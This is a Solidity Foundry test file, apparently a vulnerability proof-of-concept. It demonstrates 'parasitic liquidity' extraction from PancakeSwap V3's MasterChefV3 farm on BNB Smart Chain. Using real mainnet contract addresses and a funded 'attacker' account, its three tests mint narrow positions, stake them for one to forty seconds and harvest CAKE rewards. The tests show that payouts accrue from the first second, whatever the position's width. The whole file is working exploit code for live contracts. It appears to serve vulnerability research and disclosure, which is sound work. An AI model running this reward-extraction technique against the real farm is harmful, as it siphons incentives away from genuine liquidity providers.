// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "./HelperLib.sol";

/// @title PancakeSwap V3 Parasitic Liquidity Proof-of-Concept (BSC)
/// @author K. Ryan
/// @notice Demonstrates parasitic liquidity extraction via MasterChefV3 on BNB Smart Chain,
///         a chain without Base-style Flashblocks (sub-block pre-confirmations).
/// @dev Fork tests against unmodified PancakeSwap V3 mainnet contracts on BSC.
///
/// Chain context:
///   BSC runs 0.45-second native blocks (Fermi hard fork, 14 January 2026) with no
///   sub-block pre-confirmation layer. Flashblocks (developed by Flashbots for OP Stack
///   rollups) is deployed only on Base, Unichain, and OP Mainnet; BSC has no equivalent.
///   Reproducing the three parasitic properties on BSC therefore demonstrates that the
///   vulnerability is architectural (Synthetix accumulator applied to concentrated
///   liquidity) rather than dependent on any specific chain's timing infrastructure.
///
/// Three properties are reproduced from PCSParasitic.t.sol (Base):
///   1. Single-block reward: A position staked for one second receives non-zero CAKE
///   2. Width independence: Reward per unit liquidity is identical regardless of width
///   3. Duration independence: Reward rate per second is constant from the first second
///
/// To reproduce:
///   BSC_RPC_URL=<your_bsc_rpc> forge test --match-contract PCSParasiticBSCTest -vv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface INonfungiblePositionManager {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (uint256 tokenId, uint128 liquidity, uint256 amount0, uint256 amount1);

    function safeTransferFrom(address from, address to, uint256 tokenId) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IMasterChefV3 {
    function harvest(uint256 tokenId, address to) external returns (uint256 reward);
    function withdraw(uint256 tokenId, address to) external returns (uint256 reward);
    function CAKE() external view returns (address);
    function latestPeriodCakePerSecond() external view returns (uint256);
}

contract PCSParasiticBSCTest is Test {
    using PoolHelper for address;

    // --- PancakeSwap V3 BSC Contracts (from official docs) ---
    address constant MASTERCHEF_V3  = 0x556B9306565093C855AEA9AE92A594704c2Cd59e;
    address constant NFPM           = 0x46A15B0b27311cedF172AB29E4f4766fbE7F4364;

    // --- WBNB/USDT 500bps Pool (one of the largest BSC V3 farms) ---
    address constant POOL   = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address constant WBNB   = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant USDT   = 0x55d398326f99059fF775485246999027B3197955;
    uint24  constant FEE    = 500;
    int24   constant TICK_SPACING = 10;

    // --- Token ordering ---
    // USDT: 0x55d398...  <  WBNB: 0xbB4CdB...
    // Therefore token0 = USDT, token1 = WBNB
    address constant TOKEN0 = USDT;
    address constant TOKEN1 = WBNB;

    // --- CAKE on BSC ---
    address CAKE;

    address attacker;

    function setUp() public {
        // Pinned to the BSC block closest to 2026-03-15 12:00 UTC (mid March-2026 window).
        // Same window used by scripts/cross-chain-affordability-v05.py BSC active-tick query.
        vm.createSelectFork(vm.envString("BSC_RPC_URL"), 86_732_564);

        CAKE = IMasterChefV3(MASTERCHEF_V3).CAKE();
        attacker = address(this);

        // Fund with native BNB and USDT. Both tokens have 18 decimals on BSC.
        vm.deal(attacker, 100 ether);

        // Wrap BNB to WBNB via deposit()
        (bool ok,) = WBNB.call{value: 50 ether}(abi.encodeWithSignature("deposit()"));
        require(ok, "WBNB deposit failed");

        // Deal USDT (18 decimals on BSC)
        deal(USDT, attacker, 100_000e18);

        // Approve NFPM
        IERC20(WBNB).approve(NFPM, type(uint256).max);
        IERC20(USDT).approve(NFPM, type(uint256).max);
    }

    function _currentTick() internal view returns (int24) {
        (, int24 tick,) = POOL.getSlot0();
        return tick;
    }

    function _alignTick(int24 tick) internal pure returns (int24) {
        int24 mod = tick % TICK_SPACING;
        if (mod < 0) return tick - (TICK_SPACING + mod);
        return tick - mod;
    }

    /// @notice Mint a position. Amounts are expressed as (USDT, WBNB) in that order
    ///         since token0 = USDT and token1 = WBNB.
    function _mintPosition(int24 tickLower, int24 tickUpper, uint256 amount0, uint256 amount1)
        internal
        returns (uint256 tokenId, uint128 liquidity)
    {
        (tokenId, liquidity,,) = INonfungiblePositionManager(NFPM).mint(
            INonfungiblePositionManager.MintParams({
                token0: TOKEN0,
                token1: TOKEN1,
                fee: FEE,
                tickLower: tickLower,
                tickUpper: tickUpper,
                amount0Desired: amount0,   // USDT
                amount1Desired: amount1,   // WBNB
                amount0Min: 0,
                amount1Min: 0,
                recipient: attacker,
                deadline: block.timestamp + 300
            })
        );
    }

    function _stake(uint256 tokenId) internal {
        INonfungiblePositionManager(NFPM).safeTransferFrom(attacker, MASTERCHEF_V3, tokenId);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return this.onERC721Received.selector;
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 1: Single-block reward -- non-zero CAKE from 1 second of staking
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_BSC_SingleBlockReward() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);
        int24 upper = lower + TICK_SPACING;

        console.log("--- Test 1 (BSC): Single Block Reward ---");
        console.log("Current tick:", uint256(int256(tick)));
        console.log("Position: [%s, %s]", uint256(int256(lower)), uint256(int256(upper)));

        // Mint narrow position. Seed with ~2000 USDT and 3 WBNB; NFPM takes whatever
        // matches the current tick.
        (uint256 tokenId, uint128 liq) = _mintPosition(lower, upper, 2000e18, 3 ether);
        console.log("Token ID:", tokenId);
        console.log("Liquidity:", uint256(liq));

        _stake(tokenId);

        // Advance 1 second (~2 BSC blocks at 0.45s each)
        vm.roll(block.number + 1);
        vm.warp(block.timestamp + 1);

        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenId, attacker);
        uint256 reward = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        console.log("CAKE earned (1 second):", reward);

        assertGt(reward, 0, "FAIL: Zero CAKE from single second of staking on BSC");
        console.log("PASS: Non-zero reward from single-second staking on BSC (no Flashblocks)");
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 2: Width independence -- reward/liquidity identical for narrow vs wide
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_BSC_WidthIndependence() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);

        int24 narrowLower = lower;
        int24 narrowUpper = lower + TICK_SPACING;

        int24 wideLower = lower - (10 * TICK_SPACING);
        int24 wideUpper = lower + (10 * TICK_SPACING);

        console.log("--- Test 2 (BSC): Width Independence ---");

        (uint256 narrowId, uint128 narrowLiq) = _mintPosition(narrowLower, narrowUpper, 2000e18, 3 ether);
        (uint256 wideId, uint128 wideLiq) = _mintPosition(wideLower, wideUpper, 2000e18, 3 ether);

        console.log("Narrow liquidity:", uint256(narrowLiq));
        console.log("Wide liquidity:  ", uint256(wideLiq));

        _stake(narrowId);
        _stake(wideId);

        vm.roll(block.number + 30);
        vm.warp(block.timestamp + 60);

        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(narrowId, attacker);
        uint256 narrowReward = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(wideId, attacker);
        uint256 wideReward = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        console.log("Narrow CAKE reward:", narrowReward);
        console.log("Wide CAKE reward:  ", wideReward);

        uint256 narrowRPL = (narrowReward * 1e18) / uint256(narrowLiq);
        uint256 wideRPL   = (wideReward * 1e18) / uint256(wideLiq);

        console.log("Narrow reward/liquidity (x1e18):", narrowRPL);
        console.log("Wide reward/liquidity (x1e18):  ", wideRPL);

        uint256 diff = narrowRPL > wideRPL ? narrowRPL - wideRPL : wideRPL - narrowRPL;
        uint256 pctDiff = (diff * 10000) / narrowRPL;
        console.log("Difference (bps):", pctDiff);

        assertLt(pctDiff, 100, "FAIL: Reward/liquidity differs by >1% on BSC");
        console.log("PASS: Reward per unit liquidity is width-independent on BSC");
    }

    // ═══════════════════════════════════════════════════════════════════════════════
    // TEST 3: Duration independence -- no warmup period
    // ═══════════════════════════════════════════════════════════════════════════════

    function test_PCS_BSC_DurationIndependence() public {
        int24 tick = _currentTick();
        int24 lower = _alignTick(tick);
        int24 upper = lower + TICK_SPACING;

        console.log("--- Test 3 (BSC): Duration Independence ---");

        // === Phase A: 2 seconds of staking ===
        (uint256 tokenIdA,) = _mintPosition(lower, upper, 2000e18, 3 ether);
        _stake(tokenIdA);

        vm.roll(block.number + 4);
        vm.warp(block.timestamp + 2);

        uint256 cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenIdA, attacker);
        uint256 rewardA = IERC20(CAKE).balanceOf(attacker) - cakeBefore;
        IMasterChefV3(MASTERCHEF_V3).withdraw(tokenIdA, attacker);

        uint256 rateA = rewardA / 2;

        console.log("Phase A: 2 seconds");
        console.log("  CAKE reward:", rewardA);
        console.log("  Rate/sec:   ", rateA);

        // === Phase B: 40 seconds of staking ===
        (uint256 tokenIdB,) = _mintPosition(lower, upper, 2000e18, 3 ether);
        _stake(tokenIdB);

        vm.roll(block.number + 80);
        vm.warp(block.timestamp + 40);

        cakeBefore = IERC20(CAKE).balanceOf(attacker);
        IMasterChefV3(MASTERCHEF_V3).harvest(tokenIdB, attacker);
        uint256 rewardB = IERC20(CAKE).balanceOf(attacker) - cakeBefore;

        uint256 rateB = rewardB / 40;

        console.log("Phase B: 40 seconds");
        console.log("  CAKE reward:", rewardB);
        console.log("  Rate/sec:   ", rateB);

        uint256 diff = rateA > rateB ? rateA - rateB : rateB - rateA;
        uint256 pctDiff = rateA > 0 ? (diff * 10000) / rateA : 0;
        console.log("Rate difference (bps):", pctDiff);

        assertLt(pctDiff, 500, "FAIL: Rate differs >5% between short and long durations on BSC");
        console.log("PASS: No warmup period on BSC - reward rate constant from first second");
    }
}
